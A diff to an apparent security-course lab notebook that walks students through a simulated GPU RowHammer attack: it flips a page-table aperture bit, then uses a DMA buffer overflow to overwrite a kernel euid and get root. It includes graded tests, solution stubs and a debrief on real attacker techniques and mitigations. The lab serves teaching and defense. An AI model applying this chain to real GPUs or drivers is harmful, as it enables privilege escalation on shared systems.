@@ -1017,6 +1017,29 @@ def find_aggressors(victim_row: int) -> tuple[int, int]:
         # and |aggressor_a - aggressor_b| == 2
         return (0, 0)
 
+
+agg_a, agg_b = find_aggressors(PTE_ROW)
+print(f"Ex 2.1: aggressors for PTE_ROW={PTE_ROW} → {agg_a}, {agg_b}")
+
+
+@report
+def test_find_aggressors(solution: Callable[[int], tuple[int, int]]):
+    for victim in [PTE_ROW, 100, 7777, 42]:
+        a, b = solution(victim)
+        assert abs(a - b) == 2, (
+            f"aggressors for victim={victim} must differ by 2, got ({a}, {b})"
+        )
+        assert (a + b) // 2 == victim, (
+            f"victim={victim} must lie between aggressors, midpoint was "
+            f"{(a + b) // 2}"
+        )
+    print("  Aggressor geometry correct!")
+
+
+test_find_aggressors(find_aggressors)
+
+env.stage1_aggressors_ok = True
+
 # %%
 """
 ### Exercise 2.2: Hammer until a bit flips
@@ -1030,6 +1053,7 @@ keys "flipped", "rounds", "total_ns".
 """
 
 def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_rounds: int = 2_000_000) -> dict:
+    """Drive the DRAM into a RowHammer flip on ``victim_row``."""
     if "SOLUTION":
         total_ns = 0
         rounds = 0
@@ -1043,8 +1067,57 @@ def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_r
             "total_ns": total_ns
         }
     else:
-        # TODO: Implement the hammer loop
-        return {"flipped": False, "rounds": 0, "total_ns": 0}
+        # TODO:
+        # 1. Initialise total_ns and rounds counters.
+        # 2. While `dram.has_flipped(victim_row)` is False (and you are
+        #    below `max_rounds`):
+        #      - call dram.hammer_once(aggressor_a, aggressor_b)
+        #      - add its return value (nanoseconds) to total_ns
+        #      - increment rounds
+        # 3. Return {"rounds": rounds, "total_ns": total_ns,
+        #            "flipped": dram.has_flipped(victim_row)}
+        return {"rounds": 0, "total_ns": 0, "flipped": False}
+
+
+flip_run = hammer_until_flip(env.dram, agg_a, agg_b, PTE_ROW)
+print(
+    f"Ex 2.2: flipped={flip_run['flipped']} after "
+    f"{flip_run['rounds']:,} rounds "
+    f"({flip_run['total_ns'] / 1_000_000:.2f} ms)"
+)
+
+
+@report
+def test_hammer_until_flip(solution: Callable[..., dict]):
+    fresh = make_environment()
+    victim = fresh.dram.flip_location[0]
+    a, b = victim - 1, victim + 1
+    res = solution(fresh.dram, a, b, victim)
+    assert res["flipped"], f"expected a flip to land, got {res}"
+    assert res["rounds"] >= HAMMER_THRESHOLD_ACTIVATIONS, (
+        f"expected at least {HAMMER_THRESHOLD_ACTIVATIONS:,} rounds, "
+        f"got {res['rounds']:,}"
+    )
+    expected_ns = res["rounds"] * 2 * ACTIVATE_PRECHARGE_NS
+    assert res["total_ns"] == expected_ns, (
+        f"total_ns must accumulate hammer_once return; "
+        f"expected {expected_ns}, got {res['total_ns']}"
+    )
+    # Using a non-double-sided pair must not flip anything.
+    other = make_environment()
+    no_flip = solution(other.dram, 0, 5, other.dram.flip_location[0], max_rounds=1000)
+    assert not no_flip["flipped"], (
+        "hammer_until_flip must stop at max_rounds if aggressors are wrong"
+    )
+    print("  Hammer loop and cycle accounting correct!")
+
+
+test_hammer_until_flip(hammer_until_flip)
+
+env.stage2_flipped_in_refresh_window = (
+    flip_run["flipped"]
+    and flip_run["total_ns"] / 1_000_000 < REFRESH_WINDOW_MS
+)
 
 # %%
 """
@@ -1053,11 +1126,19 @@ def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_r
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
 
-Call `env.page_table.sync_from_dram(env.dram)` to re-read the PTE from
-DRAM. Return the (before, after) aperture values.
+The DRAM bit is flipped, but the GPU MMU's cached copy still says
+"aperture = GPU VRAM". Call `page_table.sync_from_dram(env.dram)` to
+re-read the PTE bytes from DRAM, then return the `(before, after)` pair
+of aperture values.
+
+A real attacker triggers this re-walk with a GPU context switch, an
+explicit TLB flush from the driver, or simply by waiting for the cache
+line to be evicted.
 """
 
+
 def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
+    """Resync the PT from DRAM. Return (before_aperture, after_aperture)."""
     if "SOLUTION":
         before = env.page_table.cached_pte.aperture
         env.page_table.sync_from_dram(env.dram)
@@ -1067,6 +1148,38 @@ def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
         # TODO: Capture before value, call sync_from_dram, capture after value
         return (0, 0)
 
+
+before, after = trigger_pte_refresh(env)
+print(f"Ex 2.3: aperture {before} → {after} (expected 0 → 1)")
+
+
+@report
+def test_trigger_pte_refresh(solution: Callable[[Environment], tuple[int, int]]):
+    fresh = make_environment()
+    # Hammer it directly (so we test *only* the refresh step in isolation).
+    v = fresh.dram.flip_location[0]
+    while not fresh.dram.has_flipped(v):
+        fresh.dram.hammer_once(v - 1, v + 1)
+    assert fresh.page_table.cached_pte.aperture == APERTURE_GPU_LOCAL, (
+        "cached PTE must still be stale before sync_from_dram runs"
+    )
+    pair = solution(fresh)
+    assert pair == (APERTURE_GPU_LOCAL, APERTURE_SYSTEM), (
+        f"expected (0, 1), got {pair}"
+    )
+    assert fresh.page_table.cached_pte.aperture == APERTURE_SYSTEM, (
+        "after refresh, cached_pte must reflect APERTURE_SYSTEM"
+    )
+    print("  PT resync propagated the flip!")
+
+
+test_trigger_pte_refresh(trigger_pte_refresh)
+
+env.stage3_aperture_changed = (before, after) == (
+    APERTURE_GPU_LOCAL,
+    APERTURE_SYSTEM,
+)
+
 # %%
 """
 ### Exercise 2.4: Craft the OOB DMA payload
@@ -1074,9 +1187,18 @@ def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
 
-Return a payload of length DRIVER_BUFFER_SIZE + 4 where the last 4 bytes
-encode new_euid as a little-endian integer.
+You need a byte string for the DMA payload such that:
+
+1. Its length is exactly `DRIVER_BUFFER_SIZE + 4` bytes. The first
+   `DRIVER_BUFFER_SIZE` bytes fill the driver buffer; the last 4 bytes
+   overflow into the `euid` field of the cred struct.
+2. The last 4 bytes encode the integer `0` (root's euid) as a 4-byte
+   little-endian number — matching how `KernelCred.euid` is serialised.
+
+You can put any content in the first `DRIVER_BUFFER_SIZE` bytes. The
+convention is to use `b"A"` so the hexdump is easy to read.
 """
+
 
 def craft_overflow_payload(new_euid: int = 0) -> bytes:
     """Return a DMA payload that overflows the driver buffer into euid."""
@@ -1089,6 +1211,37 @@ def craft_overflow_payload(new_euid: int = 0) -> bytes:
         # 3. Return filler + euid_bytes.
         return b""
 
+
+payload = craft_overflow_payload()
+print(
+    f"Ex 2.4: payload={len(payload)} bytes "
+    f"({DRIVER_BUFFER_SIZE} filler + 4 euid)"
+)
+
+
+@report
+def test_craft_overflow_payload(solution: Callable[..., bytes]):
+    p = solution()
+    assert isinstance(p, (bytes, bytearray)), (
+        f"payload must be bytes, got {type(p).__name__}"
+    )
+    assert len(p) == DRIVER_BUFFER_SIZE + 4, (
+        f"expected {DRIVER_BUFFER_SIZE + 4} bytes, got {len(p)}"
+    )
+    assert int.from_bytes(p[-4:], "little") == 0, (
+        f"last 4 bytes should encode euid=0 little-endian, "
+        f"got {p[-4:].hex()}"
+    )
+    # Parameterised euid should round-trip.
+    p2 = solution(42)
+    assert int.from_bytes(p2[-4:], "little") == 42, (
+        f"parameterised new_euid should be respected, got {p2[-4:].hex()}"
+    )
+    print("  Payload layout correct!")
+
+
+test_craft_overflow_payload(craft_overflow_payload)
+
 # %%
 """
 ### Exercise 2.5: Fire the DMA and confirm root
@@ -1096,8 +1249,16 @@ def craft_overflow_payload(new_euid: int = 0) -> bytes:
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
 
-Call perform_gpu_dma with the payload and return whether we achieved root.
+Hand the payload to `perform_gpu_dma`. The simulator resolves the PTE,
+validates the transaction with the IOMMU (which approves — the page is
+mapped), and writes the payload into the driver page. The overflow lands
+on the cred struct and `env.kernel_cred.is_root()` flips to True.
+
+Call `perform_gpu_dma` with the positional arguments
+`(payload, VICTIM_GPU_VADDR, env.page_table, env.iommu, env.dram,
+env.driver_page)`, then return `env.kernel_cred.is_root()`.
 """
+
 
 def escalate_privileges(env: Environment, payload: bytes) -> bool:
     """Perform the DMA. Return True iff the cred struct now shows root."""
@@ -1106,14 +1267,84 @@ def escalate_privileges(env: Environment, payload: bytes) -> bool:
                        env.iommu, env.dram, env.driver_page)
         return env.kernel_cred.is_root()
     else:
-        # TODO: Call perform_gpu_dma and return env.kernel_cred.is_root()
+        # TODO:
+        # 1. Call perform_gpu_dma(payload, VICTIM_GPU_VADDR,
+        #    env.page_table, env.iommu, env.dram, env.driver_page).
+        # 2. Return env.kernel_cred.is_root().
         return False
+
+
+rooted = escalate_privileges(env, payload)
+print(f"Ex 2.5: root achieved? {rooted}")
+
+
+@report
+def test_escalate_privileges(solution: Callable[..., bool]):
+    # Build a fresh chain-completed env (DRAM flipped + PT resynced)
+    # so the solution is exercised in isolation.
+    fresh = make_environment()
+    v = fresh.dram.flip_location[0]
+    while not fresh.dram.has_flipped(v):
+        fresh.dram.hammer_once(v - 1, v + 1)
+    fresh.page_table.sync_from_dram(fresh.dram)
+    # Build an overflow payload directly so the test is independent of
+    # Exercise 2.4 still being defined in the caller's namespace.
+    overflow_payload = b"A" * DRIVER_BUFFER_SIZE + (0).to_bytes(4, "little")
+    assert not fresh.kernel_cred.is_root(), (
+        "sanity: cred must start non-root"
+    )
+    ok = solution(fresh, overflow_payload)
+    assert ok is True, "escalate_privileges should return True on success"
+    assert fresh.kernel_cred.is_root(), (
+        "kernel_cred.euid should be 0 after the OOB write"
+    )
+    # Test idempotency-ish: a payload that does NOT overflow must not root.
+    fresh2 = make_environment()
+    while not fresh2.dram.has_flipped(v):
+        fresh2.dram.hammer_once(v - 1, v + 1)
+    fresh2.page_table.sync_from_dram(fresh2.dram)
+    tiny = b"A" * (DRIVER_BUFFER_SIZE - 1)  # no overflow
+    ok2 = solution(fresh2, tiny)
+    assert ok2 is False, (
+        "a payload shorter than DRIVER_BUFFER_SIZE must NOT escalate"
+    )
+    print("  End-to-end escalation succeeded!")
+
+
+test_escalate_privileges(escalate_privileges)
+
+env.stage4_root_obtained = rooted
+
+# %%
+"""
+### Print the flag
+
+If every stage above succeeded, `env.check_all()` prints the flag.
+Otherwise it tells you which stage still needs work.
+"""
+
+env.check_all()
 
 # %%
 """
 ## 3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)
 
 Optional exercises for deeper understanding. Each is short and independent.
+
+### Exercise 3.1 (Optional): Decode a PTE by hand
+
+> **Difficulty**: 🔴🔴⚪⚪⚪
+> **Importance**: 🔵🔵🔵⚪⚪
+
+Prove you understand the PTE byte layout by parsing an 8-byte PTE into a
+dict of the form `{"valid": bool, "aperture": int, "physical_frame": int}`
+without using `gpubreach_sim.pte.decode_pte`.
+
+Recall the layout (from the PTE module docstring):
+
+* byte 0: flags (bit 0 = valid, bit 1 = aperture, bits 2–7 reserved)
+* bytes 1–6: 48-bit little-endian physical frame number
+* byte 7: reserved
 """
 
 def decode_pte_manually(raw: bytes) -> dict:
@@ -1127,7 +1358,36 @@ def decode_pte_manually(raw: bytes) -> dict:
             "physical_frame": int.from_bytes(raw[1:7], "little"),
         }
     else:
+        # TODO: pick apart raw[0], raw[1:7], bit by bit.
         return {"valid": False, "aperture": 0, "physical_frame": 0}
+
+
+# A sample PTE: valid=1, aperture=1, PFN=0xABCDEF
+sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
+print(f"Ex 3.1: decoded = {decode_pte_manually(sample)}")
+
+
+@report
+def test_decode_pte_manually(solution: Callable[[bytes], dict]):
+    sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
+    got = solution(sample)
+    assert got["valid"] is True, f"'valid' should be True, got {got['valid']}"
+    assert got["aperture"] == 1, f"'aperture' should be 1, got {got['aperture']}"
+    assert got["physical_frame"] == 0xABCDEF, (
+        f"'physical_frame' should be 0xABCDEF, got {got['physical_frame']:#x}"
+    )
+    # aperture=0, valid=1 case
+    other = bytes([0b0000_0001]) + (1).to_bytes(6, "little") + b"\x00"
+    got2 = solution(other)
+    assert got2 == {"valid": True, "aperture": 0, "physical_frame": 1}
+    # invalid
+    inv = bytes(8)
+    got3 = solution(inv)
+    assert got3["valid"] is False, "all-zero PTE must be invalid"
+    print("  Hand-decoded PTE matches the simulator's decode!")
+
+
+test_decode_pte_manually(decode_pte_manually)
 
 
 # %%
@@ -1160,6 +1420,35 @@ def find_flipped_bits(before: bytes, after: bytes) -> set[tuple[int, int]]:
         # TODO: iterate over pairs of bytes, XOR them, and record each
         # differing bit as (byte_index, bit_position).
         return set()
+
+
+fresh3 = make_environment()
+pre = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
+while not fresh3.dram.has_flipped(PTE_ROW):
+    fresh3.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
+post = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
+print(f"Ex 3.2: flipped bits = {find_flipped_bits(pre, post)}")
+
+
+@report
+def test_find_flipped_bits(solution: Callable[[bytes, bytes], set]):
+    fresh = make_environment()
+    pre = fresh.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
+    while not fresh.dram.has_flipped(PTE_ROW):
+        fresh.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
+    post = fresh.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
+    flips = solution(pre, post)
+    assert flips == {(0, APERTURE_BIT_POS)}, (
+        f"expected exactly the aperture bit to flip, got {flips}"
+    )
+    # Sanity: identical byte strings → no flips.
+    assert solution(b"\x00\x01\x02", b"\x00\x01\x02") == set()
+    # Sanity: two byte differences → two (or more) flips.
+    assert len(solution(b"\x00\x00", b"\xff\xff")) == 16
+    print("  Exactly one flip, at the aperture bit — as templated!")
+
+
+test_find_flipped_bits(find_flipped_bits)
 
 
 # %%
@@ -1200,6 +1489,42 @@ def hammer_budget(threshold: int = HAMMER_THRESHOLD_ACTIVATIONS, tRC_ns: int = A
     
 
 
+
+budget = hammer_budget()
+print(
+    f"Ex 3.3: {budget['rounds']:,} rounds × {2 * ACTIVATE_PRECHARGE_NS} ns "
+    f"= {budget['total_ms']:.2f} ms "
+    f"(fits 64ms window: {budget['fits_refresh_window']})"
+)
+
+
+@report
+def test_hammer_budget(solution: Callable[..., dict]):
+    res = solution()
+    assert res["rounds"] == HAMMER_THRESHOLD_ACTIVATIONS, (
+        f"expected {HAMMER_THRESHOLD_ACTIVATIONS} rounds, got {res['rounds']}"
+    )
+    expected_ns = HAMMER_THRESHOLD_ACTIVATIONS * 2 * ACTIVATE_PRECHARGE_NS
+    assert res["total_ns"] == expected_ns, (
+        f"expected total_ns={expected_ns}, got {res['total_ns']}"
+    )
+    assert abs(res["total_ms"] - expected_ns / 1_000_000) < 1e-9, (
+        f"total_ms should be total_ns / 1e6, got {res['total_ms']}"
+    )
+    assert res["fits_refresh_window"] is True, (
+        f"with these parameters the budget should fit {REFRESH_WINDOW_MS} ms, "
+        f"got fits_refresh_window={res['fits_refresh_window']}"
+    )
+    # Sanity: with a 1-ms refresh window it must NOT fit.
+    tight = solution(refresh_ms=1)
+    assert tight["fits_refresh_window"] is False, (
+        "fits_refresh_window must respect the refresh_ms parameter"
+    )
+    print("  Budget arithmetic correct!")
+
+
+test_hammer_budget(hammer_budget)
+
 # %%
 """
 ### Exercise 3.4 (Optional): Maximum hammer rounds inside the window
@@ -1220,6 +1545,34 @@ def max_rounds_in_window(refresh_ms: int = REFRESH_WINDOW_MS, tRC_ns: int = ACTI
         return budget_ns // per_round
     else:
         return 0
+
+
+max_rounds = max_rounds_in_window()
+headroom = max_rounds / HAMMER_THRESHOLD_ACTIVATIONS
+print(
+    f"Ex 3.4: up to {max_rounds:,} rounds fit in {REFRESH_WINDOW_MS} ms "
+    f"→ {headroom:.1f}× threshold headroom"
+)
+
+
+@report
+def test_max_rounds_in_window(solution: Callable[..., int]):
+    got = solution()
+    expected = (REFRESH_WINDOW_MS * 1_000_000) // (2 * ACTIVATE_PRECHARGE_NS)
+    assert got == expected, f"expected {expected}, got {got}"
+    # With a 1ms window the budget must shrink by ~64×.
+    short = solution(refresh_ms=1)
+    assert short == 1_000_000 // (2 * ACTIVATE_PRECHARGE_NS), (
+        f"parameterised window ignored, got {short}"
+    )
+    # Headroom must be > 1× or the lab wouldn't work.
+    assert got > HAMMER_THRESHOLD_ACTIVATIONS, (
+        f"budget {got} must exceed threshold {HAMMER_THRESHOLD_ACTIVATIONS}"
+    )
+    print("  Budget arithmetic and parameterisation both correct!")
+
+
+test_max_rounds_in_window(max_rounds_in_window)
 
 
 # %%
@@ -1258,6 +1611,30 @@ def probe_iommu(env: Environment) -> dict:
         return {"intra_page_ok": False, "overflow_page": False, "other_page": False}
 
 
+probe = probe_iommu(env)
+print(f"Ex 3.5: IOMMU probe = {probe}")
+
+
+@report
+def test_probe_iommu(solution: Callable[[Environment], dict]):
+    # Use a fresh environment so the test does not depend on a module-level
+    # ``env`` that the answer file may or may not still have around.
+    fresh = make_environment()
+    got = solution(fresh)
+    assert got["intra_page_ok"] is True, (
+        "IOMMU should allow a full-page write to the mapped driver page"
+    )
+    assert got["overflow_page"] is False, (
+        "IOMMU must reject writes that cross the page boundary"
+    )
+    assert got["other_page"] is False, (
+        "IOMMU must reject writes to a page it hasn't mapped for this device"
+    )
+    print("  IOMMU enforces what it promises — and no more!")
+
+
+test_probe_iommu(probe_iommu)
+
 # %%
 """
 ### Exercise 3.6 (Optional): Measure the OOB overflow precisely
@@ -1278,6 +1655,21 @@ def overflow_bytes(payload_len: int) -> int:
         return 0
 
 
+for n in [0, DRIVER_BUFFER_SIZE - 1, DRIVER_BUFFER_SIZE, DRIVER_BUFFER_SIZE + 4]:
+    print(f"Ex 3.6: payload {n}B → overflow {overflow_bytes(n)}B")
+
+
+@report
+def test_overflow_bytes(solution: Callable[[int], int]):
+    assert solution(0) == 0
+    assert solution(DRIVER_BUFFER_SIZE) == 0
+    assert solution(DRIVER_BUFFER_SIZE + 4) == 4
+    assert solution(DRIVER_BUFFER_SIZE + 100) == 100
+    assert solution(DRIVER_BUFFER_SIZE - 1) == 0  # underflow clamps to 0
+    print("  Overflow arithmetic correct!")
+
+
+test_overflow_bytes(overflow_bytes)
 # %%
 """
 ### Exercise 3.7 (Optional): A tighter payload
@@ -1306,17 +1698,106 @@ def craft_precise_payload(cred_offset_in_page: int, new_euid: int) -> bytes:
     else:
         return b""
 
+
+
+tight = craft_precise_payload(CRED_OFFSET, 0)
+print(f"Ex 3.7: precise payload is {len(tight)} bytes")
+
+
+@report
+def test_craft_precise_payload(solution: Callable[[int, int], bytes]):
+    # Using the simulator's real CRED_OFFSET must escalate.
+    fresh = make_environment()
+    v = fresh.dram.flip_location[0]
+    while not fresh.dram.has_flipped(v):
+        fresh.dram.hammer_once(v - 1, v + 1)
+    fresh.page_table.sync_from_dram(fresh.dram)
+    p = solution(CRED_OFFSET, 0)
+    assert len(p) == CRED_OFFSET + 4, (
+        f"expected {CRED_OFFSET + 4} bytes, got {len(p)}"
+    )
+    perform_gpu_dma(
+        p,
+        VICTIM_GPU_VADDR,
+        fresh.page_table,
+        fresh.iommu,
+        fresh.dram,
+        fresh.driver_page,
+    )
+    assert fresh.kernel_cred.is_root(), (
+        "payload should have landed euid=0 at CRED_OFFSET"
+    )
+    # And it should respect non-zero euids, too.
+    p2 = solution(CRED_OFFSET, 1337)
+    assert int.from_bytes(p2[-4:], "little") == 1337
+    print("  Precise payload placement correct!")
+
+
+test_craft_precise_payload(craft_precise_payload)
+
 # %%
-"""
-## 4️⃣ Phase 4 — Debrief (Discussion Questions)
+# """
+# ## 4️⃣ Phase 4 — Debrief (15 min discussion)
 
-1. **Real-world timing**: How does the lab's ~20ms vs 64ms window compare to actual GPU RowHammer attacks?
-2. **ECC limitations**: Why doesn't SECDED ECC prevent this attack?
-3. **IOMMU scope**: Why doesn't the IOMMU block the out-of-bounds write?
-4. **Attack discovery**: How would a real attacker find the target PTE row location?
+# Discuss the following with your partner and then with a TA. These
+# questions connect the lab numbers back to real-world attack economics.
 
-Reference answers are available in the full solution file.
-"""
+# <details>
+# <summary><b>Question 4.1:</b> In the lab we saw a flip land in ~20ms against a 64ms window — comfortable headroom. What about the real world?</summary>
+
+# In the GPUHammer paper, on an RTX 3080 the authors measured ~9ms to the
+# first flip on double-sided patterns against tREFW ≈ 32ms — about a 3×
+# safety margin. On A100s the margin is smaller (and ECC complicates
+# things) but still positive. Mitigations that multiply the refresh rate
+# by 2× eat bandwidth and do not close the gap; mitigations like pTRR
+# (probabilistic Target Row Refresh) have been shown to be bypassable with
+# more careful activation patterns.
+
+# The headroom is *shrinking* with each process node because cells are
+# smaller → leak faster → lower activation threshold, while tREFW barely
+# changes. The trend line is against the defender.
+# </details>
+
+
+# <details>
+# <summary><b>Question 4.2:</b> Why is the IOMMU, which we all rely on for DMA isolation, not the right tool here?</summary>
+
+# Page granularity. The IOMMU's abstraction is "may device X touch
+# physical page P?", which is the right abstraction for malicious or buggy
+# devices writing to unrelated memory. It is the wrong abstraction for a
+# bug-within-a-mapped-page, because software — the driver — subdivides the
+# page into objects and owns the sub-page bounds. Moving the cred struct
+# out of that page (SLAB hardening, per-cred page allocations) is the
+# correct structural mitigation; IOMMU tweaks are not.
+# </details>
+
+# <details>
+# <summary><b>Question 4.3:</b> How would a real attacker find the target PTE row from an unprivileged process?</summary>
+
+# They combine several techniques:
+
+# * **Templating** — run an offline characterisation of the target GPU in a
+#   CI environment or on their own hardware to build a map of "these
+#   (row, column, bit) locations flip reliably under this hammer pattern."
+#   In GPUHammer the template is sold as a probability distribution over
+#   bit flips per sub-page, good enough to find PTEs with the desired
+#   aperture-bit alignment.
+# * **Memory massaging** — spray GPU allocations with controlled page
+#   tables via CUDA, OpenGL, or Vulkan, until a PT page lands in a row
+#   the template says is flippable. This is statistical but typically
+#   reliable within a few seconds on an idle GPU.
+# * **Side-channel row identification** — on some GPUs, DRAM access
+#   patterns leak via timing (row-buffer hits vs misses). An unprivileged
+#   kernel can measure this to learn which virtual pages are co-located
+#   in the same DRAM row.
+# * **Information-leak primitives in the driver** — many GPU drivers
+#   historically expose uninitialised VRAM or residual memory through
+#   compute shaders, which lets the attacker read PTE bits directly.
+
+# Defence-in-depth: isolate tenant GPUs, use MIG on NVIDIA, or put the
+# sensitive workload inside a Confidential VM with a signed GPU partition.
+# </details>
+# """
 
 # %%
 """
